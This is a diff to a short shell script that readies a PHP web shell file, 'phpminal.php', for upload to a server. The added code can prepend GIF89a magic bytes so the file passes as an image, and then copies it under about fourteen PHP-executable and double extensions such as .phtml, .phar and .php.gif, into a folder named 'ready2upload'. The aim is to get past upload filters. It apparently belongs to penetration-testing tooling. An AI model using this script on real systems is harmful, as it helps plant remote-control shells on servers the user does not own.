@@ -1,15 +1,36 @@
 mkdir ready2upload
-cp phpminal.php ready2upload/t.php
-cp phpminal.php ready2upload/t.php3
-cp phpminal.php ready2upload/t.php4
-cp phpminal.php ready2upload/t.php5
-cp phpminal.php ready2upload/t.php7
-cp phpminal.php ready2upload/t.php8
-cp phpminal.php ready2upload/t.pht
-cp phpminal.php ready2upload/t.phtm
-cp phpminal.php ready2upload/t.phtml
-cp phpminal.php ready2upload/t.phar
-cp phpminal.php ready2upload/t.phpt
-cp phpminal.php ready2upload/t.phps
-cp phpminal.php ready2upload/t.jpg.php
-cp phpminal.php ready2upload/t.php.jpg
+
+if [ "$1" == "-h" ]
+then
+    echo "USAGE:"
+    echo "$0 [OPTIONS]"
+    echo ""
+    echo "Options:" 
+    echo "-g ... Inject GIF89a in the files to imitate a GIF file"
+
+elif [ "$1" == "-g" ]
+then
+    echo -n "GIF89a" > t.php
+    cat phpminal.php >> t.php
+
+else
+    cp phpminal.php t.php
+
+fi
+
+cp t.php ready2upload/t.php
+cp t.php ready2upload/t.php3
+cp t.php ready2upload/t.php4
+cp t.php ready2upload/t.php5
+cp t.php ready2upload/t.php7
+cp t.php ready2upload/t.php8
+cp t.php ready2upload/t.pht
+cp t.php ready2upload/t.phtm
+cp t.php ready2upload/t.phtml
+cp t.php ready2upload/t.phar
+cp t.php ready2upload/t.phpt
+cp t.php ready2upload/t.phps
+cp t.php ready2upload/t.gif.php
+cp t.php ready2upload/t.php.gif
+
+rm t.php
